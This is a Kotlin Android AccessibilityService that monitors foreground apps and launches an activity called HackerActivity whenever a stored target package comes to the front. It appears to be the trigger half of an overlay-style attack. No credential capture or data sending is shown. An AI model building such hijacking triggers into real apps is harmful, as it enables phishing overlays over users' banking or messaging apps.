package com.example.securityguard

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.view.accessibility.AccessibilityEvent

class AppMonitorService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val packageName = event.packageName?.toString() ?: return

            val prefs = getSharedPreferences("app_prefs", MODE_PRIVATE)
            val targetApp = prefs.getString("target_package", "qoriqchi")

            if (!targetApp.isNullOrEmpty() && packageName.contains(targetApp, ignoreCase = true)) {
                val intent = Intent(this, HackerActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                startActivity(intent)
            }
        }
    }

    override fun onInterrupt() {}
}
